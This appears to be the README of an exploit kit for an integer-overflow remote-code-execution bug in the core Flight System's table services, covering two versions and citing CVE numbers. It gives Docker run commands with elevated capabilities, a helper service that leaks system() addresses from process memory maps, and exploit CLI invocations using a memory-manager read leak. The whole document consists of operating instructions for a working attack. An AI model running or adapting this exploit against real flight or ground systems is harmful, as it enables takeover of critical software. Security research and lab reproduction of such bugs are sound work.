# cFS TBL Integer-Overflow RCE

- **draco** — draco-rc5 (classic wrap path; MM app present)
- **v7** — v7.0.0 @ 9ba6759, the only exploitable window of CVE-2026-5476

## Build & run

```bash
docker build -f container/Dockerfile -t cfs .
docker run --rm -it --network host \
    --cap-add SYS_ADMIN \
    -v "$PWD/bin/draco:/opt/cfs/draco" \
    -v "$PWD/bin/v7:/opt/cfs/v7" \
    cfs
```

`--cap-add SYS_ADMIN` is needed for the mqueue mount and the `/proc/sys/fs/mqueue/msg_max` bump in the entrypoint (without it both `core-cpu1` procs die in `CFE_SB_CreatePipe`).

## Leak service (in-container, port 2223)

`leakd.py` locates each target by `/proc` cwd + exe name, reads libc base from
`/proc/<pid>/maps`, parses `system()` out of the ELF32 dynsym.

```bash
curl localhost:2223/draco/system
curl localhost:2223/v7/system
```

## Exploit CLI

```bash
# draco: MM (CVE-2025-25373 read side) leaks &system over the downlink
python3 cfs.py --version draco --sys auto

# v7: no MM in this image
python3 cfs.py --version v7 --sys 0x7fxxxxxxxxx
```